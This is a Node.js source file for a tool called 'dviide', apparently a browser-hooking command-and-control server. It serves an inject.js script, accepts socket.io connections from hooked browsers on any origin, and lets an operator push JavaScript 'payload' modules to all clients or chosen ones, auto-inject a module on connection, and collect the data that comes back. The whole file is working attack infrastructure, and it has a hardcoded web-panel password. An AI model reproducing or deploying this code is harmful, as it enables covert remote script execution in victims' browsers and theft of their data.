var app = require('express')();
var fs = require('fs');
var http = require('http').Server(app);
var ioweb = require('socket.io')(http);
var httpio = require('http').Server();
var io = require('socket.io')(httpio);
var clear = require('cli-clear');
var colors = require('colors');
var readline = require('readline');
var path = require('path');
var pjson = require('./package.json');
var webpassword = 'dviide';
var clients = [], webclients = [], modules = [], olm, lines = process.stdout.getWindowSize()[1], currkey = "";
var rl = readline.createInterface(process.stdin, process.stdout);
io.set('origins', '*:*');

app.get('/', function(req, res){
    res.sendFile(__dirname + '/html/index.html');
});
app.get('/inject.js', function(req, res){
    res.sendFile(__dirname + '/inject.js');
});

ioweb.on('connection', function(socket) {
  socket.on('checklogin', function(data) {
    if(data.pass == webpassword) {
      clog('[W] WebClient connected and logged in to the web interface.'.green);
      var comb = [];
      comb.id = "web-" + (webclients.length);
      comb.socket = socket;
      webclients.push(comb);
      socket.emit('passreturn', {correct: true});
    } else {
      socket.emit('passreturn', {correct: false});
    }
  });
  socket.on('disconnect', function() {
    for(i=0;i<webclients.length;i++) {
      if(webclients[i].socket == socket) {
        clog('[W] WebClient: '.red + webclients[i].id.red.bold + ' disconnected!'.red);
        webclients.splice(i, 1);
      }
    }
  });
});

io.on('connection', function(socket){
  socket.on("conn",function(data) {
    checkClient(data, '[C] Client connected with id: '.green + data.id.green.bold, socket);
  });
  socket.on("beat", function(data) {
    checkClient(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket);
  });
  socket.on("callback",function(data) {
    var ok = false;
    for(i=0;i<clients.length;i++) {
      if(clients[i].id == data.id) {
        ok = true;
      }
    }
    if(ok) {
      clog('[C] Client: '.green + data.id.green.bold + ' returned data: \n\n----------\n'.green + data.data.green.bold + '----------\n'.green);
    }
  });
  socket.on('disconnect', function() {
    for(i=0;i<clients.length;i++) {
      if(clients[i].socket == socket) {
        clog('\n[C] Client: '.red + clients[i].id.red.bold + ' disconnected!'.red);
        clients.splice(i, 1);
      }
    }
  });
});
clear();
clog(`
  ▓█████▄  ██▒   █▓ ██▓ ██▓▓█████▄ ▓█████
  ▒██▀ ██▌▓██░   █▒▓██▒▓██▒▒██▀ ██▌▓█   ▀
  ░██   █▌ ▓██  █▒░▒██▒▒██▒░██   █▌▒███
  ░▓█▄   ▌  ▒██ █░░░██░░██░░▓█▄   ▌▒▓█  ▄
  ░▒████▓    ▒▀█░  ░██░░██░░▒████▓ ░▒████▒
  ▒▒▓  ▒    ░ ▐░  ░▓  ░▓   ▒▒▓  ▒ ░░ ▒░ ░
  ░ ▒  ▒    ░ ░░   ▒ ░ ▒ ░ ░ ▒  ▒  ░ ░  ░
  ░ ░  ░      ░░   ▒ ░ ▒ ░ ░ ░  ░    ░
  ░          ░   ░   ░     ░       ░  ░
  ░           ░            ░
  `.red.bold);
  clog('Created by @idiidk. Version '.bold.red + pjson.version.bold.red + '.\n'.red.bold);

  clog('[L] Starting listener on port 3000...'.yellow);
  httpio.listen(3000, function(){
    clog('[L] Started listener and on port 3000'.green);
    clog('[L] Starting webserver on port 3030...'.yellow);
    http.listen(3030, function(){
      clog('[L] Started webserver and on port 3030'.green);
      clog('[L] Listening for connections...'.green);
      loadModules(function() {
        initComplete();
      });
    });
  });

  function handlePromptInput(input) {
    //COMMANDS
    var args = input.split(' ');
    if(args[0] == 'send') {
      if(args[1] && args[2]) {
        if(args[1] == 'all') {
          sendModuleToAllClients(args[2]);
        } else if(args[1] == 'id') {
          if(args[3]) {
            sendModuleById(args[2], args[3])
          } else {
            clog('[M] Please specify an id to use!'.red);
          }
        } else if(args[1] == 'idnum') {
          if(args[3]) {
            sendModuleByIdNum(args[2], args[3])
          } else {
            clog('[M] Please specify a module and num to use!'.red);
          }
        } else {
          clog('[M] Invalid arguments for send. mode - module name - {id}'.red);
        }
      } else {
        clog('[M] Invalid arguments for send. mode - module name - {id}'.red);
      }
    }
    else if(args[0] == 'clients') {
      if(args[1]) {
        if(args[1] == 'list') {
          if(clients.length > 0) {
            for(i=0;i<clients.length;i++) {
              clog('[C] '.green + i.toString().green + '. '.green + clients[i].id.green.bold)
            }
          } else {
            clog('[C] No clients connected'.green);
          }
        } else  if(args[1] == 'clear') {
          clients = [];
        } else {
          clog('[C] Invalid argument: '.red + args[1].toString().red);
        }
      } else {
        clog('[C] Invalid arguments.'.red);
      }
    }
    else if(args[0] == 'modules') {
      if(args[1]) {
        if(args[1] == 'list') {
          for(i=0;i<modules.length;i++) {
            clog('[M] '.green + i.toString().green + '. '.green + modules[i].green.bold);
          }
        }
      } else {
        clog('[M] Invalid arguments.'.red);
      }
    }
    else if(args[0] == 'onconn') {
      if(args[1]) {
        getModuleContentsByName(args[1], function(data) {
          olm = args[1];
          clog('[M] Module: '.green + args[1].green.bold + ' will be injected on load!'.green);
        });
      } else {
        clog('[M] No module specified!'.red);
      }
    }
    else if(args[0] == 'sendtest') {
      clog('[M] Sending testconn to all clients'.green);
      sendModuleToAllClients('testconn');
    }
  }

  function sendModuleToAllClients(mname) {
    getModuleContentsByName(mname, function(data) {
      for(i=0;i<clients.length;i++) {
        clients[i].socket.emit("command", {script: data});
        clog('[M] Sent payload to: '.green + clients[i].id.green.bold);
      }
    });
  }

  function sendModuleByIdNum(mname, idnum) {
    getModuleContentsByName(mname, function(data) {
      if(clients[idnum]) {
        for(i=0;i<clients.length;i++) {
          if(i == idnum) {
            clients[i].socket.emit("command", {script: data});
            clog('[M] Sent payload to: '.green + clients[i].id.green.bold);
          }
        }
      } else {
        clog('[M] Error client with num: '.red + idnum.toString().red.bold + ' does not seem to exist'.red)
      }
    });
  }

  function sendModuleById(mname, id) {
    getModuleContentsByName(mname, function(data) {
      for(i=0;i<clients.length;i++) {
        if(clients[i].id == id) {
          clients[i].socket.emit("command", {script: data});
          clog('[M] Sent payload to: '.green + clients[i].id.green.bold);
        }
      }
    });
  }

  function sendModuleBySocket(mname, socket) {
    getModuleContentsByName(mname, function(data) {
      socket.emit("command", {script: data});
    });
  }

  function getModuleContentsByName(name, callback) {
    if(findModuleByName(name) !== -1) {
      fs.readFile(modules[findModuleByName(name)], 'utf8', function (err,data) {
        callback(data);
      });
    } else {
      clog('[M] Module does not seem to be loaded: ' + name);
      return "";
    }
  }

  function findModuleByName(name) {
    for(i=0;i<modules.length;i++) {
      if(modules[i].indexOf(name) !== -1) {
        return i;
      }
    }
    return -1;
  }

  function prompt() {
    rl.question('> ', function(input) {
      handlePromptInput(input);
      prompt();
    });
  }

  function initComplete() {
    prompt();
  }

  function clog(message) {
    //THANKS TOM ESTEREZ FOR THIS AWESOME SOLUTION TO THE PROMPT PROBLEM! https://stackoverflow.com/users/508194/tom-esterez
    readline.cursorTo(process.stdout, 0);
    console.log(message);
    rl.prompt(true);
  }

  function loadModules(callback) {
    clog('[M] Loading module list...'.green);
    modules = [];
    var dirs = getDirectories('dviide_modules/');
    if(dirs.length > 0) {
      tempModuleLoader(0, dirs);
    } else {
      clog('[M] No modules installed!'.green);
    }
    function tempModuleLoader(d, dirs) {
      var currdir = dirs[d];
        try {
          var filepath = 'main.js';
          if (fs.existsSync('dviide_modules/' + currdir + '/' + filepath)) {
            modules.push('dviide_modules/' + currdir + '/' + filepath);
          } else {
            clog('[M] Error loading module: '.red + currdir.toString().red.bold + ' - '.red + 'Main class file specified doesn`t exist!'.red);
          }
        } catch(e) {
          clog('[M] Error loading module: '.red + currdir.toString().red.bold + ' - '.red + e.toString().red);
        }
      if(d == dirs.length - 1) {
        clog('[M] Loaded '.green + modules.length.toString().green.bold + ' modules'.green);
        if(callback) {
          callback();
        }
      } else {
        tempModuleLoader(d + 1, dirs);
      }
    }
  }

  function checkIp(req) {
    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress;
    if(ip == "::ffff:127.0.0.1" || ip == "::1") {
      return true;
    } else {
      return false;
    }
  }

  function getDirectories (srcpath) {
    return fs.readdirSync(srcpath)
    .filter(file => fs.lstatSync(path.join(srcpath, file)).isDirectory());
  }

  function checkClient(data, message, socket) {
    var ok = false;
    for(i=0;i<clients.length;i++) {
      if(clients[i].socket == socket) {
        ok = true;
      } else if(clients[i].id == data.id) {
        clog("[C] Client: ".red + data.id.red.bold + " is maybe trying something a little bit sketchy. This client was removed.".red);
        clients.splice(i, 1);
      }
    }
    if(!ok) {
      clog(message);
      var comb = [];
      comb.id = data.id;
      comb.socket = socket;
      clients.push(comb);
      if(olm) {
        sendModuleBySocket(olm, socket);
      }
    } else {
      if(message.indexOf('disconnected') === -1) {
        var comb = [];
        comb.id = data.id;
        comb.socket = socket;
        clients.push(comb);
      }
    }
  }
